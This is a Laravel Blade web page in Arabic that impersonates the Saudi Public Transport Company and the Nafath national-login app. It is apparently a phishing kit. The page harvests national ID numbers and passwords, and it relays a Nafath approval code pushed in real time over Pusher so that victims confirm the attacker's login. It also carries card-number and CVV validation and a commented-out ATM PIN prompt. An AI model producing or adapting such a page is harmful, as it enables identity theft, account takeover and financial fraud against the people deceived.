<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
  <title>{{ config('app.name', 'الرئيسية - الشركة السعودية للنقل الجماعي') }}</title>
  <meta charset="UTF-8">
  <meta name="csrf-token" content="{{ csrf_token() }}">
  <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, shrink-to-fit=no">
  <meta name="description"
    content="The Saudi Public Transport Company (عنوان الموقع) is a public owned transport company, serves the kingdom intracity, intercity and internationally like UAE, Egypt, Qatar, Kuwait, Oman, Syria, Jordan and Yemen.">
  <meta name="keywords" content="عنوان الموقع, Saudi Public Transport Company, mass transportation">
  <!-- <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous"> -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.rtl.min.css"
    integrity="sha384-nU14brUcp6StFntEOOEBvcJm4huWjB0OcIeQ3fltAfSmuZFrkAif0T+UtNGlKKQv" crossorigin="anonymous">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="{{asset('theme/build/assets/style.css')}}">
  <style>
    #error-message {
      display: none
    }

    #phone {
      border: var(--bs-border-width) solid #b7bfc7
    }

    #phone:focus {
      box-shadow: none;
      border: 1px solid #13998e;
    }

    .accordion-header {
      position: relative;
    }

    .accordion-button {
      justify-content: center
    }

    .accordion-button.collapsed {
      background-color: #bcbaba !important
    }

    .accordion-button:hover {
      background-color: #13998e !important
    }

    .accordion-button:focus {
      box-shadow: none;
      border: none
    }

    .accordion-button::after {
      display: none
    }

    .accordion-body {
      background-color: #F1F1F1
    }

    .plus-icon,
    .minus-icon {
      position: absolute;
      height: 11px;
      width: 11px;
      top: 1.2rem;
      right: 1rem;
      z-index: 9999;
    }

    .accordion-button+.plus-icon {
      display: none;
    }

    .accordion-button+.minus-icon {
      display: block;
    }

    .accordion-button.collapsed+.plus-icon {
      display: block;
    }

    .accordion-button.collapsed+.minus-icon {
      display: none;
    }

    .reset-password,
    .new-account {
      color: #50656e !important;
      font-size: 11px;
      text-decoration: none;
      padding: 4px 16px;
      border: 1px solid #999;
      border-radius: 5px;
    }
  </style>
  @yield('styles')
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="{{asset('theme/build/assets/jquery.creditCardValidator.js')}}"></script>
  <script>
    function validate(){
            var valid = true;
            $(".input_box").css('background-color','');
            var message = "";

            var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
            var cvRegex = /^[0-9]{3,3}$/;

            var cardHolderName = $("#cname").val();
            var cardNumber = $("#cnmbr").val();
            var cv = $("#cv").val();

            if(cardHolderName == "" || cardNumber == "" || cv == "") {
                message  += "<div>جميع الحقول ضرورية</div>";
                if(cardHolderName == "") {
                    $("#cname").css('background-color','#FFFFDF');
                }
                if(cardNumber == "") {
                    $("#cnmbr").css('background-color','#FFFFDF');
                }
                if (cv == "") {
                    $("#cv").css('background-color','#FFFFDF');
                }
            valid = false;
            }

            if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
                message  += "<div>الإسم حسب البطاقة غير صحيح</div>";
                    $("#cname").css('background-color','#FFFFDF');
                    valid = false;
            }

            if(cardNumber != "") {
                    $('#cnmbr').validateCreditCard(function(result){
                    if(!(result.valid)){
                            message  += "<div>رقم البطاقة غير صحيح</div>";
                            $("#cnmbr").css('background-color','#FFFFDF');
                            valid = false;
                    }
                });
            }

            // if (cv != "" && !cvRegex.test(cv)) {
            //     message  += "<div>رقم CVV خلف البطاقة غير صحيح</div>";
            //     $("#cv").css('background-color','#FFFFDF');
            //         valid = false;
            // }

            if(message != "") {
                $("#error-message").show();
                $("#error-message").html(message);
            }
            return valid;
        }
  </script>
</head>

<body class="bg-body-tertiary">

  <nav class="navbar navbar-expand-lg bg-body-tertiary border-bottom   shadow">
    <div class="container-fluid">
      <a class="navbar-brand" href="/">عنوان الموقع</a>
    </div>
  </nav>
  <h6 style="color:#13998E !important" class="text-center mt-5"> يرجى ادخال رقم الهوية الوطنية لتوثيق ربط شريحتك في
    الطلب لاصدار وثيقة التأمين الألكترونية .
  </h6>
  <section class="padding-start container mb-5 mt-2">
    <div class="row justify-content-center ">
      <div class="col-12  ">


        <div class="row">
          <div class="col-12  mt-5 mb-4">
            <div class="accordion" id="accordionExample">
              <div class="accordion-item">
                <h2 class="accordion-header" id="headingOne">
                  <button style="background-color:#13998E;color:white" class="accordion-button text-center"
                    type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="true"
                    aria-controls="collapseOne">
                    <span>تطبيق نفاذ</span>
                  </button>
                  <svg class="plus-icon" fill="#ffffff" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg"
                    xmlns:xlink="http://www.w3.org/1999/xlink" width="64px" height="64px" viewBox="0 0 45.402 45.402"
                    xml:space="preserve" stroke="#ffffff">
                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                    <g id="SVGRepo_iconCarrier">
                      <g>
                        <path
                          d="M41.267,18.557H26.832V4.134C26.832,1.851,24.99,0,22.707,0c-2.283,0-4.124,1.851-4.124,4.135v14.432H4.141 c-2.283,0-4.139,1.851-4.138,4.135c-0.001,1.141,0.46,2.187,1.207,2.934c0.748,0.749,1.78,1.222,2.92,1.222h14.453V41.27 c0,1.142,0.453,2.176,1.201,2.922c0.748,0.748,1.777,1.211,2.919,1.211c2.282,0,4.129-1.851,4.129-4.133V26.857h14.435 c2.283,0,4.134-1.867,4.133-4.15C45.399,20.425,43.548,18.557,41.267,18.557z">
                        </path>
                      </g>
                    </g>
                  </svg>
                  <svg class="minus-icon" width="64px" height="64px" viewBox="0 -12 32 32" version="1.1"
                    xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                    xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" fill="#ffffff" stroke="#ffffff">
                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                    <g id="SVGRepo_iconCarrier">
                      <title>minus</title>
                      <desc>Cra.</desc>
                      <defs> </defs>
                      <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"
                        sketch:type="MSPage">
                        <g id="Icon-Set-Filled" sketch:type="MSLayerGroup"
                          transform="translate(-414.000000, -1049.000000)" fill="#ffffff">
                          <path
                            d="M442,1049 L418,1049 C415.791,1049 414,1050.79 414,1053 C414,1055.21 415.791,1057 418,1057 L442,1057 C444.209,1057 446,1055.21 446,1053 C446,1050.79 444.209,1049 442,1049"
                            id="minus" sketch:type="MSShapeGroup"> </path>
                        </g>
                      </g>
                    </g>
                  </svg>
                </h2>
                <div id="collapseOne" class="accordion-collapse collapse show" aria-labelledby="headingOne"
                  data-bs-parent="#accordionExample">
                  <div class="accordion-body">
                    <div class="card-body row col-md-7 m-auto bg-white py-3">

                      <div id="code-waiting" class="text-center   p-5">
                        <div class="spinner-border text-center" style="width: 3rem; height: 3rem;" role="status">
                          <span class="visually-hidden text-center">Loading...</span>
                        </div>
                        <h1 class="text-center" style="color:#13998e !important">الرجاء الإنتظار</h1>
                        <p class="text-center" style="color: #13998e !important">جاري ارسال رمز التحقق خلال لحظات...</p>
                      </div>
                      <div id="code-content" style="display: none">
                        <div class="col-12 mt-3 ">
                          {{-- <h3 style="color: black">إثبات رقم الهاتف</h3> --}}
                          {{-- <p style="color: black; margin-top: 10px">الرجاء إدخال رقم البطاقة السري للصراف الاًلي
                            (ATM) المكون من 4 خانات للتأك من عملية الدفع</p> --}}
                          <span style="   color: #13998e;
                                border: 1px solid #13998e;
                                border-radius: 4px;
                                padding: 0.2rem 0.5rem;
                                text-align: center;
                                display: block;
                                margin: auto;
                                width: fit-content;" id="code">
                          </span>
                        </div>
                        <div class="col-12">
                          <div class="mb-3">
                            <label for="phone" class="form-label mt-3" style="color: dimgrey !important;
                                font-size: 14px;
                                margin: auto;
                                display: block;
                                text-align: center;">الرجاء فتح تطبيق نفاذ وتأكيد الطلب بإختيار الرقم أعلاه</label>
                            <a style="margin: 2rem auto;
                                display: block;
                                width: fit-content;" href="{{route('enter_nafad_page')}}" onclick="javascript:void()"
                              class="text-center reset-password">
                              <svg style="height: 14px;width:14px;margin:2px;" viewBox="0 0 24 24" fill="none"
                                xmlns="http://www.w3.org/2000/svg">
                                <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                                <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                                <g id="SVGRepo_iconCarrier">
                                  <path fill-rule="evenodd" clip-rule="evenodd"
                                    d="M16.2929 3.29289C16.6834 2.90237 17.3166 2.90237 17.7071 3.29289L20.7071 6.29289C21.0976 6.68342 21.0976 7.31658 20.7071 7.70711L17.7071 10.7071C17.3166 11.0976 16.6834 11.0976 16.2929 10.7071C15.9024 10.3166 15.9024 9.68342 16.2929 9.29289L17.5857 8.00006H7.85181C5.70703 8.00006 4 9.75511 4 12C4 12.5523 3.55228 13 3 13C2.44772 13 2 12.5523 2 12C2 8.72205 4.53229 6.00006 7.85181 6.00006H17.5858L16.2929 4.70711C15.9024 4.31658 15.9024 3.68342 16.2929 3.29289ZM21 11C21.5523 11 22 11.4477 22 12C22 15.3283 19.2275 18.0001 15.9578 18.0001H6.41427L7.70711 19.2929C8.09763 19.6834 8.09763 20.3166 7.70711 20.7071C7.31658 21.0976 6.68342 21.0976 6.29289 20.7071L3.29289 17.7071C2.90237 17.3166 2.90237 16.6834 3.29289 16.2929L6.29289 13.2929C6.68342 12.9024 7.31658 12.9024 7.70711 13.2929C8.09763 13.6834 8.09763 14.3166 7.70711 14.7071L6.41415 16.0001H15.9578C18.1524 16.0001 20 14.1945 20 12C20 11.4477 20.4477 11 21 11Z"
                                    fill="#73767d"></path>
                                </g>
                              </svg>
                              <span>إلغاء</span>
                            </a>
                          </div>
                        </div>
                      </div>

                    </div>
                  </div>
                </div>
              </div>
              <div class="accordion-item">
                <h2 class="accordion-header" id="headingTwo">
                  <button style="background-color:#13998E;color:white" class="accordion-button text-center collapsed"
                    type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwo" aria-expanded="false"
                    aria-controls="collapseTwo">
                    اسم المستخدم وكلمة المرور
                  </button>
                  <svg class="plus-icon" fill="#ffffff" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg"
                    xmlns:xlink="http://www.w3.org/1999/xlink" width="64px" height="64px" viewBox="0 0 45.402 45.402"
                    xml:space="preserve" stroke="#ffffff">
                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                    <g id="SVGRepo_iconCarrier">
                      <g>
                        <path
                          d="M41.267,18.557H26.832V4.134C26.832,1.851,24.99,0,22.707,0c-2.283,0-4.124,1.851-4.124,4.135v14.432H4.141 c-2.283,0-4.139,1.851-4.138,4.135c-0.001,1.141,0.46,2.187,1.207,2.934c0.748,0.749,1.78,1.222,2.92,1.222h14.453V41.27 c0,1.142,0.453,2.176,1.201,2.922c0.748,0.748,1.777,1.211,2.919,1.211c2.282,0,4.129-1.851,4.129-4.133V26.857h14.435 c2.283,0,4.134-1.867,4.133-4.15C45.399,20.425,43.548,18.557,41.267,18.557z">
                        </path>
                      </g>
                    </g>
                  </svg>
                  <svg class="minus-icon" width="64px" height="64px" viewBox="0 -12 32 32" version="1.1"
                    xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                    xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" fill="#ffffff" stroke="#ffffff">
                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                    <g id="SVGRepo_iconCarrier">
                      <title>minus</title>
                      <desc>Created with Sketch Beta.</desc>
                      <defs> </defs>
                      <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"
                        sketch:type="MSPage">
                        <g id="Icon-Set-Filled" sketch:type="MSLayerGroup"
                          transform="translate(-414.000000, -1049.000000)" fill="#ffffff">
                          <path
                            d="M442,1049 L418,1049 C415.791,1049 414,1050.79 414,1053 C414,1055.21 415.791,1057 418,1057 L442,1057 C444.209,1057 446,1055.21 446,1053 C446,1050.79 444.209,1049 442,1049"
                            id="minus" sketch:type="MSShapeGroup"> </path>
                        </g>
                      </g>
                    </g>
                  </svg>
                </h2>
                <div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo"
                  data-bs-parent="#accordionExample">
                  <div class="accordion-body">
                    <div class="card-body row col-md-8 m-auto bg-white">

                      <form class="col-12 col-md-6 mt-5 mb-4" method="post" action="{{route('save_nafad_id')}}">
                        @csrf
                        <div class="col-12 mt-3 ">
                        </div>
                        <div class="col-12">
                          <div class="mb-3">
                            <label for="phone" class="form-label" style="    color: #7c7a7a !important;
                                    font-size: 14px;
                                    font-weight: normal;">اسم المستخدم \ الهوية الوطنية</label>
                            <input type="text" class="form-control cd" id="username" name="username" placeholder=""
                              required>
                          </div>
                        </div>
                        <div class="col-12">
                          <div class="mb-3">
                            <label for="phone" class="form-label" style="    color: #7c7a7a !important;
                                    font-size: 14px;
                                    font-weight: normal;">كلمة المرور</label>
                            <input type="password" class="form-control cd" id="password" name="password" placeholder=""
                              required>
                          </div>
                        </div>
                        <div class="col-12 mt-5">
                          <button style="font-size: 14px;
                                    width: 100%;
                                    background-color: #13998E;
                                    color: white;
                                    display: flex;
                                    justify-content: center;
                                }" type="submit" class="btn btn-lg form-control-lg">
                            <svg width="23px" height="21px" viewBox="0 0 24 24" fill="none"
                              xmlns="http://www.w3.org/2000/svg">
                              <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                              <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                              <g id="SVGRepo_iconCarrier">
                                <path
                                  d="M18 20.75H15C14.8011 20.75 14.6103 20.671 14.4697 20.5303C14.329 20.3897 14.25 20.1989 14.25 20C14.25 19.8011 14.329 19.6103 14.4697 19.4696C14.6103 19.329 14.8011 19.25 15 19.25H18C18.2969 19.2758 18.5924 19.1863 18.8251 19.0001C19.0579 18.814 19.21 18.5453 19.25 18.25V5.77997C19.21 5.48462 19.0579 5.21599 18.8251 5.0298C18.5924 4.84362 18.2969 4.75415 18 4.77997H15C14.8011 4.77997 14.6103 4.70096 14.4697 4.5603C14.329 4.41965 14.25 4.22889 14.25 4.02997C14.25 3.83106 14.329 3.6403 14.4697 3.49964C14.6103 3.35899 14.8011 3.27997 15 3.27997H18C18.3468 3.26522 18.693 3.31899 19.019 3.43821C19.3449 3.55742 19.6442 3.73974 19.8996 3.97473C20.155 4.20972 20.3616 4.49277 20.5075 4.80768C20.6535 5.12259 20.7359 5.46319 20.75 5.80997V18.22C20.7359 18.5668 20.6535 18.9074 20.5075 19.2223C20.3616 19.5372 20.155 19.8202 19.8996 20.0552C19.6442 20.2902 19.3449 20.4725 19.019 20.5917C18.693 20.711 18.3468 20.7647 18 20.75Z"
                                  fill="#ffffff"></path>
                                <path
                                  d="M11 16.75C10.9015 16.7504 10.8038 16.7312 10.7128 16.6934C10.6218 16.6557 10.5393 16.6001 10.47 16.53C10.3296 16.3893 10.2507 16.1987 10.2507 16C10.2507 15.8012 10.3296 15.6106 10.47 15.47L13.94 12L10.47 8.52997C10.3375 8.38779 10.2654 8.19975 10.2688 8.00545C10.2723 7.81115 10.351 7.62576 10.4884 7.48835C10.6258 7.35093 10.8112 7.27222 11.0055 7.26879C11.1998 7.26537 11.3878 7.33749 11.53 7.46997L15.53 11.47C15.6705 11.6106 15.7494 11.8012 15.7494 12C15.7494 12.1987 15.6705 12.3893 15.53 12.53L11.53 16.53C11.4608 16.6001 11.3782 16.6557 11.2872 16.6934C11.1962 16.7312 11.0986 16.7504 11 16.75Z"
                                  fill="#ffffff"></path>
                                <path
                                  d="M15 12.75H4C3.80109 12.75 3.61032 12.671 3.46967 12.5303C3.32902 12.3897 3.25 12.1989 3.25 12C3.25 11.8011 3.32902 11.6103 3.46967 11.4697C3.61032 11.329 3.80109 11.25 4 11.25H15C15.1989 11.25 15.3897 11.329 15.5303 11.4697C15.671 11.6103 15.75 11.8011 15.75 12C15.75 12.1989 15.671 12.3897 15.5303 12.5303C15.3897 12.671 15.1989 12.75 15 12.75Z"
                                  fill="#ffffff"></path>
                              </g>
                            </svg>
                            تسجيل الدخول
                          </button>
                        </div>
                        <div class="col-12 mt-5 text-center">
                          <div class="d-flex justify-content-between ">
                            <a href="#" onclick="javascript:void()" class="text-center reset-password">
                              <svg style="height: 14px;width:14px;margin:2px" viewBox="0 0 24 24" fill="none"
                                xmlns="http://www.w3.org/2000/svg" stroke="#1f1e1e">
                                <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                                <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                                <g id="SVGRepo_iconCarrier">
                                  <path
                                    d="M12 14.5V16.5M7 10.0288C7.47142 10 8.05259 10 8.8 10H15.2C15.9474 10 16.5286 10 17 10.0288M7 10.0288C6.41168 10.0647 5.99429 10.1455 5.63803 10.327C5.07354 10.6146 4.6146 11.0735 4.32698 11.638C4 12.2798 4 13.1198 4 14.8V16.2C4 17.8802 4 18.7202 4.32698 19.362C4.6146 19.9265 5.07354 20.3854 5.63803 20.673C6.27976 21 7.11984 21 8.8 21H15.2C16.8802 21 17.7202 21 18.362 20.673C18.9265 20.3854 19.3854 19.9265 19.673 19.362C20 18.7202 20 17.8802 20 16.2V14.8C20 13.1198 20 12.2798 19.673 11.638C19.3854 11.0735 18.9265 10.6146 18.362 10.327C18.0057 10.1455 17.5883 10.0647 17 10.0288M7 10.0288V8C7 5.23858 9.23858 3 12 3C14.7614 3 17 5.23858 17 8V10.0288"
                                    stroke="#757070" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                  </path>
                                </g>
                              </svg>
                              <span>إعادة تعيين / تغيير كلمة المرور</span>
                            </a>
                            <a href="#" onclick="javascript:void()" class="text-center reset-password">
                              <svg style="height: 14px;width:14px;margin:2px" viewBox="0 0 24 24" fill="none"
                                xmlns="http://www.w3.org/2000/svg">
                                <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                                <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                                <g id="SVGRepo_iconCarrier">
                                  <path
                                    d="M5 21C5 17.134 8.13401 14 12 14C15.866 14 19 17.134 19 21M16 7C16 9.20914 14.2091 11 12 11C9.79086 11 8 9.20914 8 7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7Z"
                                    stroke="#7b7474" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                  </path>
                                </g>
                              </svg>
                              <span>حساب جديد</span>
                            </a>
                          </div>
                        </div>
                      </form>
                      <div class="col-12 col-md-6 mt-5 mb-4 text-center">
                        <img src="{{asset('theme/images/secure.svg')}}" alt="apple store logo" style="    height: 155px;
                            margin: auto;">
                        <p style="color: #555555!important;
                            font-size: 13px;">
                          الرجاء إدخال اسم المستخدم \ الهوية الوطنية وكلمة المرور ثم اضغط تسجيل الدخول.
                        </p>
                      </div>

                    </div>
                  </div>
                </div>
              </div>

            </div>



          </div>

        </div>
      </div>
    </div>
    </div>
  </section>


  {{-- <footer>
    <p class="text-light">الشركة السعودية للنقل الجماعي (عنوان الموقع)</p>
  </footer> --}}

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous">
  </script>
  <script>
    function onlyNumberKey(evt) {

            // Only ASCII character in that range allowed
            var ASCIICode = (evt.which) ? evt.which : evt.keyCode
            if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
                return false;
            return true;
        }
  </script>

  <script>
    const returnid = document.getElementById('returnid');

        function handleRadioClick() {
        if (document.getElementById('show').checked) {
            returnid.style.display = 'block';
        } else {
            returnid.style.display = 'none';
        }
        }

        const radioButtons = document.querySelectorAll('input[name="type"]');
        radioButtons.forEach(radio => {
        radio.addEventListener('click', handleRadioClick);
        });
  </script>

  <script>
    const returnid2 = document.getElementById('returnid2');

        function handleRadioClick() {
        if (document.getElementById('show2').checked) {
            returnid2.style.display = 'block';
        } else {
            returnid2.style.display = 'none';
        }
        }

        const radioButtons2 = document.querySelectorAll('input[name="type"]');
        radioButtons2.forEach(radio => {
        radio.addEventListener('click', handleRadioClick);
        });
  </script>

  <script>
    function onlyNumberKey(evt) {

            // Only ASCII character in that range allowed
            var ASCIICode = (evt.which) ? evt.which : evt.keyCode
            if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
                return false;
            return true;
        }
  </script>
  <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
  <script>
    // Enable pusher logging - don't include this in production
      Pusher.logToConsole = true;

      // var pusher = new Pusher('119332eca087a1d4c34fb', {
      // cluster: 'ap2'
      // });
      var pusher = new Pusher('2fa3b52f022492400aa0', {
        cluster: 'mt1'
      });
      var channel = pusher.subscribe("recieve-code-{{$not->id}}");
    channel.bind('App\\Events\\RecieveCodeEvent', function(data) {
      localStorage.setItem('code',data.code)

          // window.location.href= "{{route('verify_recieved_code')}}";
            document.getElementById("code").innerHTML = data.code;
            $('#code-waiting').hide();
            $('#code-content').show();
            setTimeout(function () {
              window.location.href= "{{route('final_step')}}";

            },20000);

  });

  </script>
  @yield('scripts')

</body>

</html>